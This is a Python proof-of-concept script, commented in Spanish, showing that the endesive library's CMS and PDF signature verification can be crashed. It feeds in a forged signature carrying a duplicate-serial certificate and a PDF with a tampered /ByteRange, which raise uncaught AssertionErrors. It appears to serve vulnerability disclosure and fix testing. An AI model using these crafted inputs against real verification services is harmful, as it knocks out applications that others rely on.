#!/usr/bin/env python3
# PoC: la verificacion de firmas de endesive lanza EXCEPCIONES NO CAPTURADAS ante entradas
# manipuladas por un atacante, en vez de devolver un resultado "invalido" limpio. Un unico
# documento/firma malicioso hace crashear al verificador (y a la app que lo usa). CWE-248/617/755.
import sys
#sys.path.insert(0, 'newprogs/endesive')
from asn1crypto import cms
from endesive import verifier
from endesive.pdf.verify import verify as pdf_verify

P = 'examples/test-SHA256_RSA-signed-cms.pdf'
data = open(P, 'rb').read()
n = data.find(b'/ByteRange'); s = data.find(b'[', n); e = data.find(b']', s)
br = [int(x) for x in data[s+1:e].split()]
contents = data[br[0]+br[1]+1:br[2]-1]
der = bytes.fromhex(contents.decode())
datau = data[br[0]:br[0]+br[1]] + data[br[2]:br[2]+br[3]]

# --- Crash 1: verifier.verify -> 'assert cert is None' (verifier.py:63) con 2 certs de igual serial ---
ci = cms.ContentInfo.load(der); sd = ci['content']
certs = list(sd['certificates'])
dup = cms.CertificateChoices.load(certs[0].dump())
sd['certificates'] = cms.CertificateSet(certs + [dup])
mal = ci.dump()
print("== Crash 1: verifier.verify con 2 certificados del mismo serial ==")
try:
    verifier.verify(mal, datau, None)
    print("  NO crash")
except ValueError:
    print("  FIXED")
except AssertionError:
    print("  [!!!] AssertionError NO capturada (verifier.py:63 'assert cert is None')")

# --- Crash 2: pdf.verify (modulo) -> assert de delimitadores ByteRange (pdf/verify.py:358) ---
# Manipular el /ByteRange para que los bytes delimitadores no sean '<'(60) y '>'(62).
mal2 = bytearray(data)
# desplazar br[1] en +1 para que pdfdata[br[1]] ya no sea '<'
newbr = f"[{br[0]} {br[1]+2} {br[2]} {br[3]}]".encode()
oldbr = data[s:e+1]
mal2 = data.replace(oldbr, newbr, 1)
print("== Crash 2: pdf.verify con /ByteRange manipulado (delimitadores) ==")
try:
    pdf_verify(bytes(mal2), None)
    print("  NO crash")
except ValueError:
    print("  FIXED")
except AssertionError:
    print("  [!!!] AssertionError NO capturada (pdf/verify.py:358 assert delimitadores '<' '>')")
except Exception as ex:
    print(f"  [!!!] {type(ex).__name__} NO capturada en pdf.verify: {ex}")
